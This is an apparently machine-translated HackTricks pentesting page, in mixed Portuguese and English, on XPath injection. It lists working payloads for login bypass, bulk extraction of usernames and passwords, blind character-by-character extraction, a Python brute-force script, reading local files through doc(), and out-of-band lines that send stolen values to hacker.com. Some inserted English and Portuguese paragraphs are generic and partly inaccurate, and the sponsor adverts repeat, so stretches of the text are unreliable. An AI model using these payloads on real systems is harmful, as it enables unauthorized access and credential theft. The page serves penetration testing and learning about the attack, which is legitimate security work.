# Inje√ß√£o de XPATH

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando os clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se a lenda do hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## **Sintaxe B√°sica**

A inje√ß√£o de XPATH √© uma t√©cnica de ataque usada para explorar aplicativos que constroem consultas XPath (XML Path Language) a partir de entradas fornecidas pelo usu√°rio para consultar ou navegar em documentos XML.

Informa√ß√µes sobre como fazer consultas: [https://www.w3schools.com/xml/xpath\_syntax.asp](https://www.w3schools.com/xml/xpath\_syntax.asp)

### N√≥s

| Express√£o | Descri√ß√£o                                                                                           |
| ---------- | ----------------------------------------------------------------------------------------------------- |
| nodename   | Seleciona todos os n√≥s com o nome "nodename"                                                            |
| /          | Seleciona a partir do n√≥ raiz                                                                            |
| //         | Seleciona n√≥s no documento a partir do n√≥ atual que correspondem √† sele√ß√£o, n√£o importa onde estejam |
| .          | Seleciona o n√≥ atual                                                                              |
| ..         | Seleciona o pai do n√≥ atual                                                                |
| @          | Seleciona atributos                                                                                    |

### **Exemplos:**

| Express√£o de Caminho | Resultado                                                                                                                                 |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| bookstore       | Seleciona todos os n√≥s com o nome "bookstore"                                                                                            |
| /bookstore      | Seleciona o elemento raiz bookstore**Observa√ß√£o:** Se o caminho come√ßar com uma barra ( / ), ele sempre representa um caminho absoluto para um elemento! |
| bookstore/book  | Seleciona todos os elementos book que s√£o filhos de bookstore                                                                               |
| //book          | Seleciona todos os elementos book n√£o importa onde eles estejam no documento                                                                     |
| bookstore//book | Seleciona todos os elementos book que s√£o descendentes do elemento bookstore, n√£o importa onde eles estejam sob o elemento bookstore           |
| //@lang         | Seleciona todos os atributos com o nome lang                                                                                             |

### Predicados

| Express√£o de Caminho                     | Resultado                                                                                                                                                                                                                                                                                                         |
| ----------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /bookstore/book\[1]                 | <p>Seleciona o primeiro elemento book que √© filho do elemento bookstore.<strong>Observa√ß√£o:</strong> No IE 5,6,7,8,9 o primeiro n√≥ √©[0], mas de acordo com a W3C, √© [1]. Para resolver esse problema no IE, defina a SelectionLanguage como XPath:</p><p>Em JavaScript: xml.setProperty("SelectionLanguage","XPath");</p> |
| /bookstore/book\[last()]            | Seleciona o √∫ltimo elemento book que √© filho do elemento bookstore                                                                                                                                                                                                                                       |
| /bookstore/book\[last()-1]          | Seleciona o pen√∫ltimo elemento book que √© filho do elemento bookstore                                                                                                                                                                                                                               |
| /bookstore/book\[position()<3]      | Seleciona os dois primeiros elementos book que s√£o filhos do elemento bookstore                                                                                                                                                                                                                                 |
| //title\[@lang]                     | Seleciona todos os elementos title que possuem um atributo chamado lang                                                                                                                                                                                                                                               |
| //title\[@lang='en']                | Seleciona todos os elementos title que possuem um atributo "lang" com um valor de "en"                                                                                                                                                                                                                               |
| /bookstore/book\[price>35.00]       | Seleciona todos os elementos book do elemento bookstore que possuem um elemento price com um valor maior que 35.00                                                                                                                                                                                               |
| /bookstore/book\[price>35.00]/title | Seleciona todos os elementos title dos elementos book do elemento bookstore que possuem um elemento price com um valor maior que 35.00                                                                                                                                                                         |

### N√≥s Desconhecidos

| Coringa | Descri√ß√£o                  |
| -------- | ---------------------------- |
| \*       | Corresponde a qualquer n√≥ de elemento     |
| @\*      | Corresponde a qualquer n√≥ de atributo   |
| node()   | Corresponde a qualquer n√≥ de qualquer tipo |
### **Exemplos:**

| Express√£o de Caminho | Resultado                                                                 |
| -------------------- | ------------------------------------------------------------------------ |
| /livraria/\*         | Seleciona todos os n√≥s de elementos filhos do elemento livraria           |
| //\*                 | Seleciona todos os elementos no documento                                 |
| //titulo\[@\*]       | Seleciona todos os elementos de t√≠tulo que possuem pelo menos um atributo de qualquer tipo |

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando seus clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se uma lenda hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## Exemplo
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
<name>pepe</name>
<password>peponcio</password>
<account>admin</account>
</user>
<user>
<name>mark</name>
<password>m12345</password>
<account>regular</account>
</user>
<user>
<name>fino</name>
<password>fino2</password>
<account>regular</account>
</user>
</data>
```
### Acessar as informa√ß√µes

XPath Injection is a technique used to exploit vulnerabilities in web applications that use XPath queries to retrieve data from XML databases. By injecting malicious XPath expressions into user input fields, an attacker can manipulate the query and gain unauthorized access to sensitive information.

To access the information, an attacker needs to identify a vulnerable input field that is used in an XPath query. This can typically be found in search forms, login pages, or any other functionality that involves querying XML data.

Once a vulnerable input field is identified, the attacker can start injecting malicious XPath expressions. These expressions are used to modify the original query and retrieve additional data that was not intended to be exposed.

For example, consider a search form that uses an XPath query to retrieve user information from an XML database. The query may look like this:

```
//users/user[name='John']
```

By injecting a malicious expression like `' or 1=1 or ''='`, the attacker can modify the query to retrieve all user information:

```
//users/user[name='John' or 1=1 or ''='']
```

This modified query will return all user information, regardless of the name specified in the search form.

To prevent XPath Injection attacks, it is important to properly validate and sanitize user input before using it in XPath queries. Input validation should include checking for special characters and ensuring that the input conforms to the expected format.

Additionally, using parameterized XPath queries can help mitigate XPath Injection attacks. Parameterized queries separate the query logic from the user input, making it harder for attackers to manipulate the query.

By understanding and implementing these security measures, web applications can protect against XPath Injection attacks and ensure the confidentiality of sensitive information.
```
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```
### Identificar e roubar o esquema

XPath Injection is a technique used to exploit vulnerabilities in web applications that use XPath queries to retrieve data from XML databases. By manipulating the input parameters of the XPath query, an attacker can modify the query to retrieve sensitive information or perform unauthorized actions.

To identify and steal the schema using XPath Injection, follow these steps:

1. **Identify the vulnerable parameter**: Look for input fields or parameters in the web application that are used in XPath queries. These parameters are usually found in the URL, form inputs, or cookies.

2. **Determine the structure of the XPath query**: Analyze the XPath query structure used by the application to retrieve data. This will help you understand how the query is constructed and how to manipulate it.

3. **Inject malicious XPath code**: Craft a payload that includes malicious XPath code to modify the query and retrieve the schema. For example, you can use the `union` operator to combine the original query with a query that retrieves the schema.

4. **Observe the application's response**: Submit the payload and observe the application's response. If the response includes the schema or any other sensitive information, it means the injection was successful.

5. **Extract the stolen schema**: Extract the stolen schema from the application's response. This can be done by parsing the response and extracting the relevant information.

By following these steps, you can identify and steal the schema using XPath Injection. It is important to note that XPath Injection can have serious consequences, as it can lead to unauthorized access to sensitive data or even compromise the entire application. Therefore, it is crucial to perform these techniques only in a controlled and authorized environment, such as during a penetration test.
```python
and count(/*) = 1 #root
and count(/*[1]/*) = 2 #count(root) = 2 (a,c)
and count(/*[1]/*[1]/*) = 1 #count(a) = 1 (b)
and count(/*[1]/*[1]/*[1]/*) = 0 #count(b) = 0
and count(/*[1]/*[2]/*) = 3 #count(c) = 3 (d,e,f)
and count(/*[1]/*[2]/*[1]/*) = 0 #count(d) = 0
and count(/*[1]/*[2]/*[2]/*) = 0 #count(e) = 0
and count(/*[1]/*[2]/*[3]/*) = 1 #count(f) = 1 (g)
and count(/*[1]/*[2]/*[3]/[1]*) = 0 #count(g) = 0

#The previous solutions are the representation of a schema like the following
#(at this stage we don't know the name of the tags, but jus the schema)
<root>
<a>
<b></b>
</a>
<c>
<d></d>
<e></e>
<f>
<h></h>
</f>
</c>
</root>

and name(/*[1]) = "root" #Confirm the name of the first tag is "root"
and substring(name(/*[1]/*[1]),1,1) = "a" #First char of name of tag `<a>` is "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105 #Firts char of tag `<b>`is codepoint 105 ("i") (https://codepoints.net/)

#Stealing the schema via OOB
doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
```
## Bypass de Autentica√ß√£o

### **Exemplo de consultas:**
```
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```
### **Bypassando OR em usu√°rio e senha (mesmo valor em ambos)**

Quando um aplicativo web utiliza a t√©cnica de XPath para consultar um banco de dados XML, √© poss√≠vel explorar uma vulnerabilidade conhecida como inje√ß√£o de XPath. Essa vulnerabilidade ocorre quando um invasor consegue inserir c√≥digo malicioso na consulta XPath, permitindo que ele manipule a l√≥gica da consulta e obtenha acesso n√£o autorizado a informa√ß√µes sens√≠veis.

Uma t√©cnica comum de inje√ß√£o de XPath √© a utiliza√ß√£o do operador OR para contornar a verifica√ß√£o de usu√°rio e senha. Normalmente, a consulta XPath para autentica√ß√£o de usu√°rio e senha seria algo como:

```xml
/users/user[username='admin' and password='password']
```

No entanto, um invasor pode explorar a vulnerabilidade de inje√ß√£o de XPath inserindo um valor que seja verdadeiro para ambos usu√°rio e senha, como:

```xml
/users/user[username='admin' or '1'='1' and password='password' or '1'='1']
```

Nesse caso, a consulta XPath se torna verdadeira, pois a express√£o `'1'='1'` sempre ser√° verdadeira. Isso permite que o invasor acesse a conta de administrador sem a necessidade de fornecer um nome de usu√°rio ou senha v√°lidos.

Para evitar a inje√ß√£o de XPath, √© importante validar e sanitizar corretamente todas as entradas do usu√°rio antes de utiliz√°-las em consultas XPath. Al√©m disso, √© recomendado utilizar t√©cnicas de autentica√ß√£o mais seguras, como a autentica√ß√£o de dois fatores, para reduzir o impacto de uma poss√≠vel explora√ß√£o dessa vulnerabilidade.
```
' or '1'='1
" or "1"="1
' or ''='
" or ""="
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())

Select account
Select the account using the username and use one of the previous values in the password field
```
### **Explorando a inje√ß√£o de nulo**

A inje√ß√£o de nulo √© uma t√©cnica comum usada para explorar vulnerabilidades em aplicativos da web que usam consultas XPath. Essa t√©cnica envolve a manipula√ß√£o de par√¢metros de entrada para inserir uma sequ√™ncia de caracteres nula na consulta XPath, o que pode levar a resultados inesperados ou at√© mesmo √† execu√ß√£o de comandos maliciosos.

#### **Identificando uma vulnerabilidade de inje√ß√£o de nulo**

Para identificar uma vulnerabilidade de inje√ß√£o de nulo, voc√™ precisa encontrar um ponto de entrada onde os dados do usu√°rio s√£o usados em uma consulta XPath. Isso geralmente ocorre em campos de pesquisa ou filtros de dados.

Uma vez identificado o ponto de entrada, voc√™ pode come√ßar a testar a vulnerabilidade inserindo uma sequ√™ncia de caracteres nula na entrada. Se a aplica√ß√£o responder de maneira inesperada ou retornar resultados diferentes, √© prov√°vel que haja uma vulnerabilidade de inje√ß√£o de nulo.

#### **Explorando a vulnerabilidade de inje√ß√£o de nulo**

Uma vez que voc√™ tenha identificado uma vulnerabilidade de inje√ß√£o de nulo, pode come√ßar a explor√°-la para obter informa√ß√µes sens√≠veis ou executar comandos maliciosos.

Uma t√©cnica comum √© usar a fun√ß√£o `substring()` para extrair partes espec√≠ficas do resultado da consulta XPath. Por exemplo, voc√™ pode usar `substring(//user/password/text(), 1, 1)` para extrair o primeiro caractere da senha do usu√°rio.

Outra t√©cnica √© usar a fun√ß√£o `count()` para determinar o n√∫mero de resultados retornados pela consulta XPath. Isso pode ser √∫til para explorar a estrutura do banco de dados subjacente.

#### **Preven√ß√£o de inje√ß√£o de nulo**

Para prevenir a inje√ß√£o de nulo, √© importante validar e sanitizar todas as entradas do usu√°rio antes de us√°-las em consultas XPath. Isso pode ser feito atrav√©s da implementa√ß√£o de filtros de entrada e do uso de fun√ß√µes de escape adequadas.

Al√©m disso, √© recomend√°vel manter todos os softwares e bibliotecas atualizados para evitar a explora√ß√£o de vulnerabilidades conhecidas.

#### **Conclus√£o**

A inje√ß√£o de nulo √© uma t√©cnica perigosa que pode ser usada para explorar vulnerabilidades em aplicativos da web que usam consultas XPath. Ao entender como essa t√©cnica funciona e implementar medidas de preven√ß√£o adequadas, voc√™ pode proteger seus aplicativos contra ataques de inje√ß√£o de nulo.
```
Username: ' or 1]%00
```
### **Duplo OU no nome de usu√°rio ou na senha** (√© v√°lido com apenas 1 campo vulner√°vel)

IMPORTANTE: Observe que a **"e" √© a primeira opera√ß√£o realizada**.
```
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())

Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2¬∫ account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())

Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
```
## Extra√ß√£o de strings

A sa√≠da cont√©m strings e o usu√°rio pode manipular os valores para realizar buscas:
```
/user/username[contains(., '+VALUE+')]
```

```
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```
### **Explora√ß√£o Cega**

### **Obter o comprimento de um valor e extra√≠-lo por compara√ß√µes:**

A inje√ß√£o de XPath cega √© uma t√©cnica usada para explorar vulnerabilidades de inje√ß√£o de XPath em um aplicativo da web. Com essa t√©cnica, √© poss√≠vel obter o comprimento de um valor e extra√≠-lo por meio de compara√ß√µes.

Para obter o comprimento de um valor, voc√™ pode usar a fun√ß√£o `string-length()`. Por exemplo, a express√£o XPath `string-length(/user/name)` retornar√° o comprimento do valor do elemento `<name>` dentro do elemento `<user>`.

Para extrair o valor por meio de compara√ß√µes, voc√™ pode usar operadores de compara√ß√£o, como `=`, `>`, `<`, `>=` e `<=`. Por exemplo, a express√£o XPath `/user[name='admin']` retornar√° todos os elementos `<user>` que possuem um elemento `<name>` com o valor "admin".

Usando essas t√©cnicas em conjunto, voc√™ pode realizar uma inje√ß√£o de XPath cega para obter informa√ß√µes sens√≠veis do aplicativo da web alvo.
```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
```
### **Exemplo em Python**
```python
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30):
r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
if ("TRUE_COND" in r.text):
l = i
break
print("[+] Password length: " + str(l))
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i))
for al in alphabet:
r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
if ("TRUE_COND" in r.text):
flag += al
print("[+] Flag: " + flag)
break
```
### Ler arquivo

A inje√ß√£o de XPath √© uma t√©cnica de ataque que permite que um invasor leia arquivos arbitr√°rios no servidor. Essa t√©cnica √© poss√≠vel quando um aplicativo web usa consultas XPath para extrair dados de um documento XML.

#### Como funciona a inje√ß√£o de XPath?

A inje√ß√£o de XPath ocorre quando um invasor manipula os par√¢metros de entrada do aplicativo web para inserir uma express√£o XPath maliciosa. Essa express√£o √© ent√£o avaliada pelo servidor, permitindo que o invasor leia arquivos do sistema.

#### Exemplo de inje√ß√£o de XPath

Considere o seguinte c√≥digo de exemplo:

```python
import lxml.etree as ET

def get_user_data(username):
    query = f"//users/user[username/text()='{username}']"
    result = ET.parse('users.xml').xpath(query)
    return result
```

Neste exemplo, a fun√ß√£o `get_user_data` recebe um nome de usu√°rio como par√¢metro e consulta um arquivo XML chamado `users.xml` usando XPath. No entanto, o c√≥digo n√£o valida ou sanitiza o par√¢metro `username`, o que torna vulner√°vel a ataques de inje√ß√£o de XPath.

Um invasor mal-intencionado pode explorar essa vulnerabilidade fornecendo um valor de entrada manipulado, como `' or 1=1 or username/text()='admin' or 'a'='a` para o par√¢metro `username`. Isso far√° com que a express√£o XPath se torne verdadeira e retorne todos os dados do usu√°rio, incluindo informa√ß√µes confidenciais.

#### Preven√ß√£o de inje√ß√£o de XPath

Para prevenir a inje√ß√£o de XPath, √© importante validar e sanitizar todas as entradas do usu√°rio antes de us√°-las em consultas XPath. Isso pode ser feito por meio de t√©cnicas como a utiliza√ß√£o de consultas parametrizadas ou a remo√ß√£o de caracteres especiais das entradas.

Al√©m disso, √© recomend√°vel restringir as permiss√µes de acesso aos arquivos do sistema, garantindo que o aplicativo web tenha apenas as permiss√µes necess√°rias para ler os arquivos relevantes.

#### Conclus√£o

A inje√ß√£o de XPath √© uma vulnerabilidade comum em aplicativos web que usam consultas XPath para extrair dados de documentos XML. Ao validar e sanitizar as entradas do usu√°rio e restringir as permiss√µes de acesso aos arquivos do sistema, √© poss√≠vel prevenir com efic√°cia esse tipo de ataque.
```python
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```
## Explora√ß√£o OOB

Out-of-Band (OOB) √© uma t√©cnica de explora√ß√£o usada em ataques de inje√ß√£o XPath. Nesse tipo de ataque, o invasor injeta c√≥digo malicioso em uma aplica√ß√£o web que utiliza XPath para consultar um banco de dados XML. A inje√ß√£o XPath ocorre quando o invasor manipula os par√¢metros de entrada da consulta XPath para obter informa√ß√µes sens√≠veis ou executar comandos indesejados.

A explora√ß√£o OOB √© uma varia√ß√£o da inje√ß√£o XPath que permite ao invasor extrair dados do servidor web por meio de solicita√ß√µes HTTP externas. Isso √© poss√≠vel porque o servidor web pode ser configurado para fazer solicita√ß√µes externas para recuperar dados de um recurso remoto, como um servidor DNS ou um servidor de arquivos.

Para explorar essa vulnerabilidade, o invasor injeta c√≥digo XPath malicioso que faz com que o servidor web envie solicita√ß√µes HTTP para um servidor controlado pelo invasor. O servidor controlado pelo invasor registra as solicita√ß√µes recebidas e, assim, o invasor pode extrair informa√ß√µes sens√≠veis do servidor web.

A explora√ß√£o OOB pode ser realizada de v√°rias maneiras, como:

- Inje√ß√£o de c√≥digo XPath malicioso que faz com que o servidor web envie solicita√ß√µes DNS para um servidor controlado pelo invasor. O invasor pode registrar as solicita√ß√µes DNS recebidas para obter informa√ß√µes sens√≠veis.
- Inje√ß√£o de c√≥digo XPath malicioso que faz com que o servidor web envie solicita√ß√µes HTTP para um servidor controlado pelo invasor. O invasor pode registrar as solicita√ß√µes HTTP recebidas para obter informa√ß√µes sens√≠veis.
- Inje√ß√£o de c√≥digo XPath malicioso que faz com que o servidor web envie solicita√ß√µes de arquivo para um servidor controlado pelo invasor. O invasor pode registrar as solicita√ß√µes de arquivo recebidas para obter informa√ß√µes sens√≠veis.

A explora√ß√£o OOB √© uma t√©cnica avan√ßada de inje√ß√£o XPath que pode ser usada para obter informa√ß√µes sens√≠veis de um servidor web. √â importante que os desenvolvedores de aplicativos web estejam cientes dessa vulnerabilidade e implementem medidas de seguran√ßa adequadas para proteger suas aplica√ß√µes contra ataques de inje√ß√£o XPath.
```python
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to
```
### Ferramenta autom√°tica

{% embed url="https://xcat.readthedocs.io/" %}

## Refer√™ncias

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20injection" %}

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando os clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se uma lenda hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
